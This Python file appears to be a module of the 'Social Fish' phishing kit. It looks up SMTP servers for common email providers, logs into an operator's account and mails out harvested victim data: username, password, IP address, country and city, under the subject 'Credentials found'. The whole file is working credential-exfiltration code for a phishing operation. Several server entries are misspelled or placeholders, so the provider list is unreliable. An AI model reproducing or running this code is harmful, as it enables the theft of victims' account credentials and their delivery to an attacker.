from huepy import *
import smtplib
def smtp_provider(provider=''):

    smtp = [
            ['uol','smtps.uol.com.br',587],
            ['bol','smtps.bol.com.br',587],
            ['gmail','smtp.gmail.com',587],
            ['yahoo','smtp.mail.yahoo.com.br',25],
            ['ig','smtp.ig.com.br',587],
            ['globo','stmp.globo.com',25],
            ['oi','stmp.oi.com.br',25],
            ['terra','smtp.xyz.com.br',25],
            ['hotmail','smtp.live.com',587],
            ['outlook','smtp.live.com',587],
            ['live','smtp.live.com',587]
           ]
    
    email_smtp = [(smtp[i][1],smtp[i][2]) for i, mailsmtp in enumerate(smtp) if provider == smtp[i][0]][0] if provider else ''   
    return email_smtp

def connect_smtp(domain,port,login,passwd):

    global obj_smtp
    global _login
    _login = login
    try:
        obj_smtp = smtplib.SMTP(domain,port)
    except OSError:
        print(red(' [!] Network is unreachable!'))
        return
    hello_smtp = obj_smtp.ehlo()
    start_smtp = obj_smtp.starttls() if hello_smtp[0] == 250 else ''
    login_smtp = obj_smtp.login(login, passwd) if start_smtp[0] == 220 else ''
    try:
        if login_smtp[0] == 235:
            print(green(' [+] Successfull Login!'))
            return obj_smtp
        else:
            print(red(' [!] Your authentication failed'))
            obj_smtp.quit()
    except IndexError:
        return

def objsmtp():
    try:
        return obj_smtp
    except NameError:
        return

def send_mail(msg, fish):

    msg_mail = 'Subject: Social Fish - Credentials found: {user}\r\n\r\n'.format(user=msg[0])
    msg_mail += '''
{site}
{user}
{passwd}
{ip}
{country}
{city}
    '''.format(
            site=fish,
            user=msg[0].strip(),
            passwd=msg[1].strip(),
            ip=msg[2].strip(),
            country=msg[3].strip(),
            city=msg[4].strip()
            ) 

    smail = obj_smtp.sendmail(_login, _login, msg_mail.encode('ascii'))
